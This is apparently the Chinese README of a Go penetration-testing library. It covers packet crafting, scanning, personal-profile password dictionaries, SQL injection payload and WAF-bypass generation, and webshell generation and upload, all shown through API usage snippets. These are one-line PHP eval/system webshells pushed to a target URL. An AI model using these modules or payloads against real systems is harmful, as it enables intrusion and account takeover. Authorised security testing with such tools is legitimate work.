# gyscan_code

Go 语言编写的网络安全开发库，支持 Windows、macOS 和 Linux 平台，采用模块化设计。

[![Go Version](https://img.shields.io/badge/Go-1.26%2B-blue)](https://go.dev/)
[![License](https://img.shields.io/badge/License-Apache%202.0-green)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)]()

## 安装

```bash
go get github.com/xiguayiqiu/gyscan_code
```

## 模块总览

| 模块                        | 说明                          | 对标              |
| ------------------------- | --------------------------- | --------------- |
| [ano](#ano)               | 网络协议操作库（数据包构造/发送/嗅探）        | Scapy           |
| [api](#api)               | API 资产发现（被动流量/前端解析/主动探测）    | —               |
| [httpclient](#httpclient) | 模拟真实浏览器的 HTTP 请求库           | Python requests |
| [passwd](#passwd)         | 密码生成（随机/社工/CUPP 字典）         | —               |
| [scanner](#scanner)       | 扫描模块（子域名/目录/端口）             | —               |
| [secjson](#secjson)       | 敏感 JSON 分析（识别/脱敏/合规）        | —               |
| [sqlexp](#sqlexp)         | SQL 注入利用（Payload 生成/WAF 绕过） | —               |
| [utils](#utils)           | 通用工具函数（进度条等）                | —               |
| [webshell](#webshell)     | Webshell 生成与上传              | —               |

---

## ano

基于 Scapy 设计理念的 Go 网络协议操作库，支持多层数据包构造、序列化/反序列化、原始套接字发送/接收、嗅探、BPF 过滤和 pcap 文件读写。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/ano"
```

### 快速开始

```go
// 构造 TCP SYN 包
pkt := ano.Build(
    ano.NewEther().SetDst("ff:ff:ff:ff:ff:ff"),
    ano.NewIPv4().SetSrc("10.0.0.1").SetDst("192.168.1.1"),
    ano.NewTCP().SetSPort(54321).SetDPort(80).SetFlags(ano.TCP_SYN),
)
data := pkt.Bytes() // 54 字节以太网帧

// 原始套接字发送（需 root）
ano.Send(pkt)
ano.SendOnIface("eth0", pkt)

// 嗅探
pkts, _ := ano.Sniff("eth0", 10*time.Second, 100)
```

### 核心特性

- **9 种协议层**：Ether, IPv4, IPv6, TCP, UDP, ICMP, ARP, DNS, Raw
- **数据包操纵**：层叠组装、增删改查、Tag 零反射机制
- **数据包 Fuzz**：对标 Scapy `fuzz()`，字段随机化
- **嗅探与捕获**：异步 Sniffer、BPF 内核过滤、pcap 文件导入导出
- **交互式 Shell**：`ano.ShellCode()` 对标 Scapy `interact()`
- **快捷构造**：`NewPacket().IPv4().TCP().Build()` 流式构建器
- **网卡识别**：列出/查找/默认接口

### 对比 Scapy

| Scapy (Python) | ano (Go) |
|----------------|----------|
| `Ether()/IP()/TCP(flags="S")` | `Build(Ether, IPv4, TCP.SetFlags(TCP_SYN))` |
| `interact()` | `ShellCode()` |
| `sniff(iface="eth0", count=10)` | `Sniff("eth0", timeout, 10)` |
| `rdpcap("file.pcap")` | `LoadPcap("file.pcap")` |
| `fuzz(pkt)` | `FuzzPacket(pkt, nil)` |

---

## api

API 资产发现库，通过**被动流量分析**、**前端代码解析**、**上下文感知主动探测**三条路径自动化识别目标系统中所有 API 端点。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/api"
```

### 快速开始

```go
cfg := &api.DiscoveryConfig{
    Target:      "example.com",
    Mode:        api.ModeFull,
    PcapPaths:   []string{"capture.pcap", "api_log.jsonl"},
    JSPaths:     []string{"./frontend/src/"},
    ActiveProbe: true,
    ProbeLimit:  500,
}

engine := api.NewDiscoveryEngine(cfg)
result, _ := engine.Run()

fmt.Printf("发现 %d 个 API 端点\n", result.TotalCount)
api.SaveReport("example.com", result.Endpoints, "report.json")
```

### 三条发现路径

| 路径 | 置信度 | 说明 |
|------|--------|------|
| 被动流量分析 | 1.0 | 从 PCAP/日志中提取真实调用的端点 |
| 前端代码解析 | 0.8 | 从 JS/TS/HTML 中提取硬编码路径 |
| 主动探测 | 0.6 | 基于已知端点生成候选 URL 并验证 |

### 核心特性

- **路径归一化**：9 级正则替换（UUID、日期、时间戳、Hash 等）
- **敏感 API 识别**：49 种路径模式 + 18 种参数模式 + 13 类分组
- **JSON 安全分析**：集成 secjson，检测响应中的敏感数据
- **Swagger/OpenAPI 解析**：自动提取端点、认证检查
- **攻击面测绘**：9 类风险面检测 + Top N 排序
- **HTTP 实时探测**：端点验证 + 认证绕过测试
- **一键发现**：`DiscoverPcap` / `DiscoverJS` / `QuickScan` 等便捷函数

---

## httpclient

对标 Python `requests` 库设计的 Go HTTP 客户端，专为网络安全渗透测试场景打造。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/httpclient"
```

### 快速开始

```go
// 一行获取内容
data := httpclient.Fetch("https://example.com")

// 下载文件
httpclient.Save("https://example.com/video.mp4", "video.mp4")

// Python 风格响应对象
resp := httpclient.FetchResponse("https://example.com")
fmt.Println(resp.Text())       // 响应文本（自动编码检测）
fmt.Println(resp.StatusCode()) // 200
fmt.Println(resp.Ok())         // true

// 链式客户端
resp = httpclient.SimpleClient().
    UA("Mozilla/5.0").
    Cookie("session", "abc").
    Encoding("gbk").
    Post("https://example.com/login", `{"user":"admin"}`)
```

### 核心特性

- **自动编码检测**：UTF-8, GBK, GB2312, Big5, Shift-JIS 等
- **资源类型识别**：JSON/HTML/Image/PDF 等自动分类
- **格式化输出**：JSON/HTML 美化
- **与 Python requests 几乎一致的使用体验**

---

## passwd

网络安全渗透测试的密码生成工具库，支持多种密码生成策略和 CUPP 社工字典。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/passwd"
```

### 快速开始

```go
// 随机密码
pwd := passwd.Generate(12)         // 大写+小写+数字
pwd := passwd.GenerateStrong(20)   // 大写+小写+数字+特殊字符
pwds := passwd.GenerateN(16, 5)    // 批量生成 5 个

// 自定义字符集
pwd := passwd.GenerateWith(8, false, false, true, false) // 纯数字

// 社工密码字典
profile := &passwd.Profile{
    FirstName: "张三", Nickname: "zs",
    BirthDate: "1995-06-15", Company: "acme",
}
pwds := passwd.CUPP(profile) // 生成社工密码字典

// 辅助函数
passwd.LeetSpeak("password") // "p4ssw0rd"
passwd.Capitalize("hello")   // "Hello"
passwd.Reverse("hello")      // "olleh"
```

---

## scanner

网络安全扫描模块，提供子域名枚举、目录扫描和端口扫描功能。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/scanner"
```

### 快速开始

```go
// 目录扫描
results := scanner.Scan("https://example.com")

// 子域名发现
results := scanner.Subs("example.com")

// Ping 检测
alive := scanner.Ping("example.com")

// 端口扫描
results := scanner.ScanPorts("example.com", []int{80, 443, 22})

// 快速端口扫描
results := scanner.QuickScan("example.com")

// 链式配置
results := scanner.NewPortScanner().
    Host("example.com").
    Ports([]int{80, 443, 22}).
    Protocol("tcp").
    Threads(100).
    Scan()
```

---

## secjson

敏感 JSON 分析库，聚焦 JSON 数据内容层的敏感信息识别与风险治理。覆盖四大分析层：**敏感字段识别**、**动态敏感性判定**、**脱敏与加密验证**、**合规与审计映射**（GDPR/PCI-DSS/等保2.0/数据安全法）。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/secjson"
```

### 快速开始

```go
// 一键扫描
finding, _ := secjson.Scan(jsonData)
fmt.Printf("风险评分: %.1f/100\n", finding.RiskScore)

// 安全判断
if secjson.IsSafe(jsonData) {
    fmt.Println("JSON 数据安全")
}

// 完整扫描（敏感+脱敏+合规）
finding, masks, compliance, _ := secjson.ScanFull(jsonData)

// 快速报告
report, _ := secjson.QuickReport(jsonData)
fmt.Println(report)
```

### 识别能力

- **33 种检测规则**：15 种敏感值正则（身份证/Luhn 校验/JWT Token/银行卡/手机号等）+ 18 种敏感字段名
- **8 种组合风险**：身份证+手机号、银行卡+手机号等危险组合自动检测
- **6 条合规规则**：PCI-DSS/GDPR/等保2.0/数据安全法自动化检查
- **4 类脱敏验证**：身份/金融/凭证/隐私脱敏质量评分（0-90 分）

---

## sqlexp

SQL 注入渗透测试的 Payload 生成与利用工具库，支持 6 种数据库、7 种注入方法、8 种 WAF 绕过策略。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/sqlexp"
```

### 快速开始

```go
// 按注入方法获取 Payload
payloads := sqlexp.Union(sqlexp.MySQL)      // Union 注入
payloads := sqlexp.Error(sqlexp.PostgreSQL)  // 报错注入
payloads := sqlexp.Time(sqlexp.MSSQL)        // 延时注入

// 登录绕过
payloads := sqlexp.LoginBypass()

// WAF 绕过
payloads := sqlexp.WAFBypass(sqlexp.BypassCommentInline)
payloads := sqlexp.WAFBypass(sqlexp.BypassHexEncode)

// 链式配置
e := sqlexp.NewExploit().
    DB(sqlexp.MySQL).
    Method(sqlexp.UnionBased).
    Columns(5).
    Target("http://example.com/page.php").
    Param("id")

// 获取 Payload 并构建请求 URL
payloads := e.GetPayloads()
probes := e.GetUnionProbe()     // 列数探测
requests := e.BuildRequests()   // URL 编码后的完整请求
```

### Payload 覆盖

| 注入方法 | 数据库 | 覆盖技术 |
|---------|--------|---------|
| 报错注入 | MySQL/PG/MSSQL/Oracle/SQLite | EXTRACTVALUE/CAST/CONVERT 等 |
| Union 注入 | MySQL/PG/MSSQL | 列数探测、information_schema/pg_catalog 枚举 |
| 布尔盲注 | MySQL/MSSQL | 真假条件、SUBSTRING/ASCII 提取 |
| 延时盲注 | MySQL/PG/MSSQL/Oracle/SQLite | SLEEP/pg_sleep/WAITFOR/DBMS_LOCK |
| 堆叠查询 | MySQL/MSSQL/PG | INSERT/DELETE/WRITE/xp_cmdshell |
| OOB 外带 | MySQL/MSSQL/Oracle/PG | LOAD_FILE/xp_dirtree/UTL_HTTP |
| WAF 绕过 | 8 种策略 | 内联注释/大小写/URL编码/Hex/空白/关键字拆分等 |

---

## utils

通用工具函数库，提供丰富的终端进度条样式（19 种）。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/utils"
```

### 快速开始

```go
// 简单进度条
for i := 0; i <= 100; i++ {
    utils.Progress(i, 100)
}

// 带速度和样式
pb := utils.NewProgressBar(100).
    SetPrefix("扫描端口").
    SetStyle("dot")
for i := 0; i <= 100; i++ {
    pb.Set(i)
}
pb.Finish()

// 彩色进度条
utils.ProgressColor(current, total)

// 赛博风格
utils.ProgressCyber(current, total)
```

---

## webshell

测试用 Webshell 生成与上传工具库，支持 PHP/ASP/ASPX/JSP 多种语言。

### 引入

```go
import "github.com/xiguayiqiu/gyscan_code/webshell"
```

### 快速开始

```go
// 生成
code := webshell.GeneratePHP("pass")       // PHP eval($_POST['pass'])
code := webshell.GeneratePHPCMD("cmd")     // PHP system($_REQUEST['cmd'])
code := webshell.GenerateASP("pass")       // ASP Execute
code := webshell.GenerateJSP("pass")       // JSP Runtime.exec

// 按类型生成
code := webshell.Generate(webshell.PHP, "pass")
all := webshell.GenerateAll("pass")        // 生成所有语言

// 上传
webshell.Upload("http://target.com/upload.php", code)
webshell.UploadWithField("http://target.com/upload.php", code, "shell.php", "file")
webshell.UploadViaPUT("http://target.com/shell.php", code)
```

---

## 测试说明

项目使用 `go run xxx.go` 运行测试：

```bash
# 模块单元测试
go test ./sqlexp/ -v
go test ./ano/ -v
```

## License

Apache License 2.0